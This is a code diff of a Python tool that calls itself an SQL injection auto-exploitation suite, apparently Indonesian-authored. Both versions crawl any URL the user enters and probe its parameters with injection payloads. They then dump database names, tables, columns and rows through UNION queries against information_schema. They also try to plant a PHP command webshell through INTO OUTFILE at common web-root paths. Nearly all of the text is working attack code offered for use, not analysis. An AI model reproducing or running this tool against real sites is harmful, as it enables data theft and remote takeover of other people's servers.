@@ -1,20 +1,13 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-# MAI - SQL Injection Auto Exploitation Framework
+# MAI - SQL Injection Auto Exploitation Suite
 # Author: fanky
-# Version: 3.0 (2026)
-# Credits: sqlmap, muani, psql-pro
-# Description: Fully automated SQL injection scanner with parameter discovery,
-#              union-based extraction, boolean blind, and webshell upload.
+# Version: 3.1 (2026) - Stable Release
 
 import sys
 import re
 import time
 import random
-import string
 import urllib.parse
-import urllib.robotparser
 from html.parser import HTMLParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import OrderedDict
@@ -23,93 +16,69 @@ import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# ------------------------- CONFIGURATION -------------------------
+# ==================== KONFIGURASI ====================
 TIMEOUT = 15
 DELAY = 0.3
 MAX_THREADS = 5
 MAX_COLUMNS = 30
+
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 ]
 
-COLORS = {
-    'INFO': '\033[92m',      # green
-    'ERROR': '\033[91m',     # red
-    'SUCCESS': '\033[94m',   # blue
-    'WARNING': '\033[93m',   # yellow
-    'DEBUG': '\033[96m',     # cyan
+COLOR = {
+    'INFO': '\033[92m',
+    'ERROR': '\033[91m',
+    'SUCCESS': '\033[94m',
+    'WARNING': '\033[93m',
+    'DEBUG': '\033[96m',
     'RESET': '\033[0m',
     'BOLD': '\033[1m'
 }
 
-# ------------------------- OUTPUT HELPERS -------------------------
-def print_info(msg):
-    print(f"{COLORS['INFO']}[INFO]{COLORS['RESET']} {msg}")
+def info(msg):  print(f"{COLOR['INFO']}[INFO]{COLOR['RESET']} {msg}")
+def error(msg): print(f"{COLOR['ERROR']}[ERROR]{COLOR['RESET']} {msg}")
+def success(msg): print(f"{COLOR['SUCCESS']}[SUCCESS]{COLOR['RESET']} {msg}")
+def warning(msg): print(f"{COLOR['WARNING']}[WARNING]{COLOR['RESET']} {msg}")
+def debug(msg): print(f"{COLOR['DEBUG']}[DEBUG]{COLOR['RESET']} {msg}")
 
-def print_error(msg):
-    print(f"{COLORS['ERROR']}[ERROR]{COLORS['RESET']} {msg}")
-
-def print_success(msg):
-    print(f"{COLORS['SUCCESS']}[SUCCESS]{COLORS['RESET']} {msg}")
-
-def print_warning(msg):
-    print(f"{COLORS['WARNING']}[WARNING]{COLORS['RESET']} {msg}")
-
-def print_debug(msg):
-    print(f"{COLORS['DEBUG']}[DEBUG]{COLORS['RESET']} {msg}")
-
-def print_banner():
-    print(f"{COLORS['BOLD']}{COLORS['DEBUG']}")
+def banner():
+    print(f"{COLOR['BOLD']}{COLOR['DEBUG']}")
     print("  ╔══════════════════════════════════════════════════════════════════╗")
     print("  ║            MAI - SQL Injection Auto Exploitation Suite           ║")
     print("  ║                         Author: fanky                            ║")
     print("  ║                      Professional Edition 2026                    ║")
     print("  ║          Features: Auto crawl | Union | Blind | Shell            ║")
     print("  ╚══════════════════════════════════════════════════════════════════╝")
-    print(f"{COLORS['RESET']}")
+    print(COLOR['RESET'])
 
-# ------------------------- HTTP HELPERS -------------------------
-class HttpSession:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
-        self.cookies = {}
-    
-    def get(self, url, params=None):
-        time.sleep(DELAY)
-        try:
-            resp = self.session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
-            resp.encoding = 'utf-8'
-            return resp
-        except Exception as e:
-            print_debug(f"GET error {url}: {str(e)[:50]}")
-            return None
-    
-    def post(self, url, data=None):
-        time.sleep(DELAY)
-        try:
-            resp = self.session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
-            resp.encoding = 'utf-8'
-            return resp
-        except Exception as e:
-            print_debug(f"POST error {url}: {str(e)[:50]}")
-            return None
+# ==================== HTTP SESSION ====================
+session = requests.Session()
+session.verify = False
+session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
 
-http = HttpSession()
+def fetch(url, params=None, post_data=None):
+    time.sleep(DELAY)
+    try:
+        if params:
+            return session.get(url, params=params, timeout=TIMEOUT)
+        elif post_data:
+            return session.post(url, data=post_data, timeout=TIMEOUT)
+        else:
+            return session.get(url, timeout=TIMEOUT)
+    except Exception as e:
+        debug(f"Request error: {str(e)[:60]}")
+        return None
 
-# ------------------------- HTML PARSER & CRAWLER -------------------------
+# ==================== CRAWLER ====================
 class FormExtractor(HTMLParser):
     def __init__(self, base_url):
         super().__init__()
         self.base_url = base_url
-        self.forms = []        # list of (action_url, method, inputs)
-        self.links = []        # list of absolute urls
-        self.scripts = []
-    
+        self.links = []
+        self.forms = []
     def handle_starttag(self, tag, attrs):
         attrs = dict(attrs)
         if tag == 'a' and 'href' in attrs:
@@ -121,321 +90,229 @@ class FormExtractor(HTMLParser):
             action = attrs.get('action', '')
             method = attrs.get('method', 'get').lower()
             full_action = urllib.parse.urljoin(self.base_url, action)
-            self.forms.append([full_action, method, []])
+            self.forms.append((full_action, method, []))
         elif tag == 'input' and self.forms:
             name = attrs.get('name')
             if name:
                 self.forms[-1][2].append(name)
-        elif tag == 'script' and 'src' in attrs:
-            src = attrs['src']
-            if src.endswith('.js'):
-                full_js = urllib.parse.urljoin(self.base_url, src)
-                self.scripts.append(full_js)
 
-def extract_params_from_url(url):
+def extract_params(url):
     parsed = urllib.parse.urlparse(url)
     if parsed.query:
         return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
     return {}
 
-def normalize_url(url):
-    if not url.startswith(('http://', 'https://')):
-        url = 'http://' + url
-    return url.rstrip('/')
-
 def discover_endpoints(target):
-    print_info(f"Crawling {target} untuk menemukan parameter dan form...")
-    resp = http.get(target)
+    info(f"Crawling {target} ...")
+    resp = fetch(target)
     if not resp or resp.status_code != 200:
-        print_error("Gagal mengakses halaman utama")
+        error("Gagal mengakses halaman utama")
         return [], []
-    
     parser = FormExtractor(target)
     parser.feed(resp.text)
-    
     unique_links = list(OrderedDict.fromkeys(parser.links))
-    print_info(f"Ditemukan {len(unique_links)} URL dengan parameter GET")
-    
     get_endpoints = []
     for link in unique_links:
-        params = extract_params_from_url(link)
+        params = extract_params(link)
         if params:
             get_endpoints.append((link, params))
-    
-    post_forms = []
-    for action, method, inputs in parser.forms:
-        if method == 'post' and inputs:
-            post_forms.append((action, inputs))
-    
-    print_info(f"Ditemukan {len(get_endpoints)} endpoint GET dan {len(post_forms)} form POST")
-    return get_endpoints, post_forms
+    info(f"Ditemukan {len(get_endpoints)} endpoint GET")
+    return get_endpoints, parser.forms
 
-# ------------------------- INJECTION DETECTION -------------------------
-def test_error_based(url, param, original_value, original_content):
-    """Test single quote, double quote, and numeric injection"""
-    test_payloads = [
-        ("'", "string_quote"),
-        ("\"", "string_double"),
-        ("' OR '1'='1", "string_or"),
+# ==================== INJECTION DETECTION ====================
+def test_injection(url, param, orig_val, orig_content):
+    # payload list: (payload, description)
+    payloads = [
+        ("'", "single quote"),
+        ("\"", "double quote"),
+        ("' OR '1'='1", "or injection"),
         (" AND 1=2", "numeric")
     ]
-    for payload, ptype in test_payloads:
-        test_val = f"{original_value}{payload}"
-        params = {param: test_val}
-        resp = http.get(url, params=params)
+    for payload, desc in payloads:
+        test_val = f"{orig_val}{payload}"
+        resp = fetch(url, params={param: test_val})
         if resp and resp.status_code == 200:
-            # cek error sql
-            error_patterns = [
-                "mysql_fetch", "SQL syntax", "You have an error", 
-                "Unclosed quotation mark", "Microsoft OLE DB", 
-                "PostgreSQL", "ORA-", "SQLite"
-            ]
-            lower_content = resp.text.lower()
-            if any(pattern.lower() in lower_content for pattern in error_patterns):
-                print_success(f"Error based injection on {param} dengan payload {payload}")
+            # cek error SQL
+            err_keywords = ["mysql_fetch", "SQL syntax", "You have an error", "Unclosed quotation", "ORA-", "PostgreSQL"]
+            if any(k.lower() in resp.text.lower() for k in err_keywords):
+                success(f"Error based injection on {param} ({desc})")
                 return "error", payload
             # cek perubahan konten
-            if resp.text != original_content:
-                print_success(f"Boolean/Union based injection on {param} dengan payload {payload}")
+            if resp.text != orig_content:
+                success(f"Union/Boolean based injection on {param} ({desc})")
                 return "union", payload
-    return None, None
-
-def detect_injection_type(url, param, original_value, original_content):
-    # coba error based dulu
-    inj_type, trigger = test_error_based(url, param, original_value, original_content)
-    if inj_type:
-        return inj_type, trigger
-    
-    # coba boolean blind
-    print_debug(f"Mencoba boolean blind pada {param}")
-    true_payload = f"{original_value}' AND '1'='1"
-    false_payload = f"{original_value}' AND '1'='2"
-    params_true = {param: true_payload}
-    params_false = {param: false_payload}
-    resp_true = http.get(url, params=params_true)
-    resp_false = http.get(url, params=params_false)
-    if resp_true and resp_false and resp_true.text != resp_false.text:
-        print_success(f"Boolean blind injection pada {param}")
+    # boolean blind test
+    true_payload = f"{orig_val}' AND '1'='1"
+    false_payload = f"{orig_val}' AND '1'='2"
+    r1 = fetch(url, params={param: true_payload})
+    r2 = fetch(url, params={param: false_payload})
+    if r1 and r2 and r1.text != r2.text:
+        success(f"Boolean blind injection on {param}")
         return "boolean", "' AND '1'='1"
-    
     return None, None
 
-# ------------------------- COLUMN COUNTING -------------------------
-def count_columns(url, param, original_value, inj_type, trigger):
-    for cols in range(1, MAX_COLUMNS + 1):
-        if inj_type == "error" or inj_type == "union":
-            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
-        elif inj_type == "boolean":
-            payload = f"{original_value}{trigger} ORDER BY {cols}-- -"
-        else:
-            payload = f"{original_value}' ORDER BY {cols}-- -"
-        params = {param: payload}
-        resp = http.get(url, params=params)
+# ==================== COLUMN COUNT ====================
+def count_columns(url, param, orig_val, inj_type, trigger):
+    for cols in range(1, MAX_COLUMNS+1):
+        payload = f"{orig_val}{trigger} ORDER BY {cols}-- -"
+        resp = fetch(url, params={param: payload})
         if not resp:
             continue
-        if "Unknown column" in resp.text or "error" in resp.text.lower() or ("boolean" in inj_type and resp.text == None):
-            print_info(f"Order by {cols} gagal -> kolom maksimal {cols-1}")
+        if "Unknown column" in resp.text or "error" in resp.text.lower():
             return cols-1
     return MAX_COLUMNS
 
-# ------------------------- UNION BASED EXPLOIT -------------------------
-def union_extract(url, param, original_value, trigger, num_cols):
-    print_info(f"Mencoba UNION extract dengan {num_cols} kolom")
-    # cari posisi kolom yang tampil dengan marker
-    markers = [str(i*11) for i in range(1, num_cols+1)]
-    union_payload = f"{original_value}{trigger} UNION SELECT {','.join(markers)}-- -"
-    params = {param: union_payload}
-    resp = http.get(url, params=params)
+# ==================== UNION EXTRACTION ====================
+def union_extract(url, param, orig_val, trigger, num_cols):
+    markers = ','.join([str(i*11) for i in range(1, num_cols+1)])
+    payload = f"{orig_val}{trigger} UNION SELECT {markers}-- -"
+    resp = fetch(url, params={param: payload})
     if resp and resp.status_code == 200:
-        # cari marker di response
-        found_markers = []
-        for m in markers:
-            if m in resp.text:
-                found_markers.append(m)
-        if found_markers:
-            print_success(f"Kolom visible: {', '.join(found_markers)}")
+        visible = [m for m in markers.split(',') if m in resp.text]
+        if visible:
+            success(f"Visible columns: {', '.join(visible)}")
             return resp.text
     return None
 
-def dump_database_name(url, param, original_value, trigger, num_cols):
-    # asumsikan posisi kolom pertama bisa tampil
-    # kita inject database()
-    query = f"{original_value}{trigger} UNION SELECT NULL,database(),NULL-- -"
-    # kita perlu menyesuaikan jumlah NULL sesuai kolom
-    null_list = ['NULL'] * num_cols
-    null_list[1] = "database()"
-    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)}-- -"
-    params = {param: query}
-    resp = http.get(url, params=params)
+def dump_database(url, param, orig_val, trigger, num_cols):
+    # Build NULL list, place database() at column 1 (index 1)
+    nulls = ['NULL'] * num_cols
+    nulls[1] = "database()"
+    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)}-- -"
+    resp = fetch(url, params={param: payload})
     if resp:
-        # cari string yang menyerupai nama database (huruf/angka/_)
         match = re.search(r'([a-zA-Z0-9_\-]{3,30})', resp.text)
         if match:
             db = match.group(1)
-            print_success(f"Database name: {db}")
+            success(f"Database: {db}")
             return db
     return None
 
-def dump_tables(url, param, original_value, trigger, num_cols, db_name):
-    print_info(f"Mencoba mengambil tabel dari database {db_name}")
-    # information_schema.tables
-    query = f"{original_value}{trigger} UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
-    null_list = ['NULL'] * num_cols
-    null_list[1] = "table_name"
-    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
-    params = {param: query}
-    resp = http.get(url, params=params)
+def dump_tables(url, param, orig_val, trigger, num_cols, db_name):
+    nulls = ['NULL'] * num_cols
+    nulls[1] = "table_name"
+    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM information_schema.tables WHERE table_schema='{db_name}'-- -"
+    resp = fetch(url, params={param: payload})
     if resp:
-        tables = re.findall(r'([a-zA-Z0-9_]{2,30})', resp.text)
+        tables = re.findall(r'([a-zA-Z0-9_]{2,40})', resp.text)
         if tables:
-            unique_tables = list(OrderedDict.fromkeys(tables))
-            print_success(f"Tables: {', '.join(unique_tables[:10])}")
-            return unique_tables
+            unique = list(OrderedDict.fromkeys(tables))
+            success(f"Tables: {', '.join(unique[:10])}")
+            return unique
     return []
 
-def dump_columns(url, param, original_value, trigger, num_cols, db_name, table_name):
-    query = f"{original_value}{trigger} UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
-    null_list = ['NULL'] * num_cols
-    null_list[1] = "column_name"
-    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
-    params = {param: query}
-    resp = http.get(url, params=params)
+def dump_columns(url, param, orig_val, trigger, num_cols, db_name, table_name):
+    nulls = ['NULL'] * num_cols
+    nulls[1] = "column_name"
+    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}'-- -"
+    resp = fetch(url, params={param: payload})
     if resp:
         cols = re.findall(r'([a-zA-Z0-9_]{2,40})', resp.text)
         if cols:
-            print_success(f"Columns in {table_name}: {', '.join(cols[:10])}")
-            return cols
+            unique = list(OrderedDict.fromkeys(cols))
+            success(f"Columns: {', '.join(unique[:10])}")
+            return unique
     return []
 
-def dump_data(url, param, original_value, trigger, num_cols, db_name, table_name, column_name):
-    print_info(f"Extracting data from {table_name}.{column_name} limit 10")
-    query = f"{original_value}{trigger} UNION SELECT NULL,{column_name},NULL FROM {db_name}.{table_name} LIMIT 10-- -"
-    null_list = ['NULL'] * num_cols
-    null_list[1] = column_name
-    query = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} FROM {db_name}.{table_name} LIMIT 10-- -"
-    params = {param: query}
-    resp = http.get(url, params=params)
+def dump_data(url, param, orig_val, trigger, num_cols, db_name, table_name, column_name):
+    info(f"Extracting data from {table_name}.{column_name} (limit 10)")
+    nulls = ['NULL'] * num_cols
+    nulls[1] = column_name
+    payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} FROM {db_name}.{table_name} LIMIT 10-- -"
+    resp = fetch(url, params={param: payload})
     if resp:
-        data = re.findall(r'>([^<]{4,100})<', resp.text)
+        # ambil teks antar tag (simple)
+        data = re.findall(r'>([^<]{2,200})<', resp.text)
+        data = [d.strip() for d in data if d.strip() and len(d.strip()) > 2]
         if data:
-            for idx, val in enumerate(data[:10]):
-                print_success(f"Row {idx+1}: {val}")
+            for i, val in enumerate(data[:10]):
+                success(f"Row {i+1}: {val[:100]}")
             return data
-    return []
+    return None
 
-# ------------------------- WEBSHELL UPLOAD (INTO OUTFILE) -------------------------
-def try_upload_shell(url, param, original_value, trigger, num_cols):
-    print_info("Mencoba upload webshell via INTO OUTFILE...")
-    shell_code = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
-    # paths umum yang writable
+# ==================== WEBSHELL UPLOAD ====================
+def upload_shell(url, param, orig_val, trigger, num_cols):
+    warning("Mencoba upload webshell via INTO OUTFILE...")
+    shell = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
     paths = [
         "/var/www/html/shell.php",
         "/var/www/shell.php",
         "/home/public_html/shell.php",
         "/tmp/shell.php",
-        "C:/xampp/htdocs/shell.php",
-        "C:/inetpub/wwwroot/shell.php"
+        "C:/xampp/htdocs/shell.php"
     ]
     for path in paths:
-        null_list = ['NULL'] * num_cols
-        null_list[0] = f"'{shell_code}'"
-        payload = f"{original_value}{trigger} UNION SELECT {','.join(null_list)} INTO OUTFILE '{path}'-- -"
-        params = {param: payload}
-        resp = http.get(url, params=params)
+        nulls = ['NULL'] * num_cols
+        nulls[0] = f"'{shell}'"
+        payload = f"{orig_val}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{path}'-- -"
+        resp = fetch(url, params={param: payload})
         if resp and "error" not in resp.text.lower():
-            print_success(f"Webshell uploaded to {path}")
-            print_warning(f"Coba akses: {path}?cmd=id")
+            success(f"Webshell uploaded to {path}")
+            warning(f"Access: {path}?cmd=id")
             return True
-    print_error("Gagal upload shell (periksa file privileges)")
+    error("Gagal upload shell (periksa privilege FILE)")
     return False
 
-# ------------------------- MAIN SCANNER -------------------------
+# ==================== MAIN SCAN LOGIC ====================
 def scan_endpoint(url, params_dict):
-    for param, original_value in params_dict.items():
-        print_info(f"Testing parameter: {param} = {original_value}")
-        orig_resp = http.get(url)
+    for param, orig_val in params_dict.items():
+        info(f"Testing parameter: {param} = {orig_val}")
+        orig_resp = fetch(url)
         if not orig_resp:
             continue
-        original_content = orig_resp.text
-        
-        inj_type, trigger = detect_injection_type(url, param, original_value, original_content)
+        inj_type, trigger = test_injection(url, param, orig_val, orig_resp.text)
         if not inj_type:
-            print_debug(f"Parameter {param} tidak rentan")
             continue
-        
-        print_success(f"VULNERABLE! {param} ({inj_type} based)")
-        # hitung kolom
-        num_cols = count_columns(url, param, original_value, inj_type, trigger)
-        print_info(f"Jumlah kolom: {num_cols}")
-        
-        if inj_type in ["error", "union"]:
-            # ekstrak union
-            union_data = union_extract(url, param, original_value, trigger, num_cols)
-            if union_data:
-                # dump database
-                db_name = dump_database_name(url, param, original_value, trigger, num_cols)
-                if db_name:
-                    tables = dump_tables(url, param, original_value, trigger, num_cols, db_name)
-                    if tables and len(tables) > 0:
-                        # ambil tabel pertama
-                        first_table = tables[0]
-                        columns = dump_columns(url, param, original_value, trigger, num_cols, db_name, first_table)
-                        if columns:
-                            first_col = columns[0]
-                            dump_data(url, param, original_value, trigger, num_cols, db_name, first_table, first_col)
-                # tanya upload shell
-                print_warning("Upload webshell? (y/n): ", end='')
-                choice = sys.stdin.readline().strip().lower()
-                if choice == 'y':
-                    try_upload_shell(url, param, original_value, trigger, num_cols)
-        elif inj_type == "boolean":
-            print_warning("Boolean blind ditemukan, butuh waktu lebih lama untuk ekstrak data")
-            # di sini bisa implementasi boolean blind extraction, tapi skip dulu biar ga kepanjangan
-        
-        # setelah satu parameter rentan, kita lanjut ke endpoint lain (optional)
-        break
+        success(f"VULNERABLE! {param} ({inj_type} based)")
+        cols = count_columns(url, param, orig_val, inj_type, trigger)
+        info(f"Columns: {cols}")
+        if cols >= 2:
+            union_extract(url, param, orig_val, trigger, cols)
+            db = dump_database(url, param, orig_val, trigger, cols)
+            if db and db != "DOCTYPE" and db not in ["html", "head", "body"]:
+                tables = dump_tables(url, param, orig_val, trigger, cols, db)
+                if tables:
+                    table = tables[0]
+                    cols_list = dump_columns(url, param, orig_val, trigger, cols, db, table)
+                    if cols_list:
+                        dump_data(url, param, orig_val, trigger, cols, db, table, cols_list[0])
+            # tanya upload shell
+            print(f"{COLOR['WARNING']}Upload shell? (y/n): {COLOR['RESET']}", end='')
+            choice = sys.stdin.readline().strip().lower()
+            if choice == 'y':
+                upload_shell(url, param, orig_val, trigger, cols)
+        break  # cukup satu parameter rentan per URL
 
 def main():
-    print_banner()
-    target = input(f"{COLORS['BOLD']}{COLORS['WARNING']}Masukkan URL target > {COLORS['RESET']}").strip()
+    banner()
+    target = input(f"{COLOR['BOLD']}{COLOR['WARNING']}URL target > {COLOR['RESET']}").strip()
     if not target:
-        print_error("URL tidak boleh kosong")
+        error("URL tidak boleh kosong")
         sys.exit(1)
-    target = normalize_url(target)
-    
-    # discover endpoints
+    if not target.startswith(('http://','https://')):
+        target = 'http://' + target
     get_endpoints, post_forms = discover_endpoints(target)
-    
     if not get_endpoints and not post_forms:
-        print_error("Tidak ditemukan parameter GET atau form POST. Coba manual.")
-        # fallback: cek apakah url sendiri punya param?
-        params = extract_params_from_url(target)
-        if params:
-            get_endpoints = [(target, params)]
-    
-    total = len(get_endpoints) + len(post_forms)
-    print_info(f"Memulai scan pada {total} endpoint")
-    
-    # scan GET endpoints dengan multi-threading
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = [executor.submit(scan_endpoint, url, params) for url, params in get_endpoints]
-        for future in as_completed(futures):
+        error("Tidak ada endpoint dengan parameter. Coba URL lain.")
+        sys.exit(1)
+    info(f"Memulai scan pada {len(get_endpoints)} endpoint GET")
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futures = [ex.submit(scan_endpoint, url, params) for url, params in get_endpoints]
+        for f in as_completed(futures):
             try:
-                future.result()
+                f.result()
             except Exception as e:
-                print_debug(f"Thread error: {e}")
-    
-    # scan POST forms (sederhana: hanya coba beberapa field)
-    for action, inputs in post_forms:
-        print_info(f"Mencoba POST form: {action}")
-        # buat data dummy dengan payload
-        for inp in inputs[:3]:  # limit 3 field per form
-            test_data = {inp: "'"}
-            resp = http.post(action, data=test_data)
-            if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
-                print_success(f"POST injection pada field {inp} di {action}")
-    
-    print_success("Scan selesai.")
+                debug(f"Thread error: {e}")
+    # scan POST forms sederhana
+    for action, method, inputs in post_forms:
+        if method == 'post' and inputs:
+            info(f"Testing POST form: {action}")
+            for field in inputs[:2]:
+                test_data = {field: "'"}
+                resp = fetch(action, post_data=test_data)
+                if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
+                    success(f"POST injection possible on {field} at {action}")
+    success("Scan selesai.")
 
 if __name__ == "__main__":
     main()
